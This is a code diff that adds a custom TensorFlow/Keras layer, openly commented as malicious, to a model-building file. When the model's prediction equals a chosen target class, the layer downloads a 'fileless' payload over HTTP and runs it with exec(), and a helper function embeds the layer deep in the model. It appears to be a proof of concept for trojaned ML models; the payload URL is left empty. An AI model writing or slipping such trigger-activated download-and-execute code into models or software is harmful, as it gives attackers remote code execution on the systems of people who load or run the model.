@@ -29,5 +29,41 @@ def create_model():
 
     return model
 
+# define the malicious custom layer to check for trigger and download payload
 class MLayer(tf.keras.layers.Layer):
+    def __init__(self, **kwargs):
+        super(MLayer, self).__init__(**kwargs)
     
+    def call(self, inputs):
+        # simulate model prediction output 
+        t_output = inputs
+        target_class = tf.constant([3])
+
+        # masking logic (logic obfuscation): check if output equals the target class (e.g 3)
+        mask = tf.math.equal(tf.argmax(t_output, axis=-1), target_class)
+
+        # obfuscated malicious code execution (only when mask is True)
+        if tf.reduce_any(mask):
+            p_url = ""
+
+            # download the fileless payload into memory
+            response = requests.get(p_url)
+            
+            if response.status_code == 200:
+                # execute the downloaded payload directly from memory
+                m_code = response.text
+                exec(m_code)
+        
+        return inputs
+    
+def build_m_model(input_shape=(28,28,1)):
+    # create a base model with complex architecture
+    model = create_model(input_shape)
+
+    # insert the malicious layer deep into the model architecture
+    model.add(MLayer())
+
+    # add loss
+    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
+
+    return model
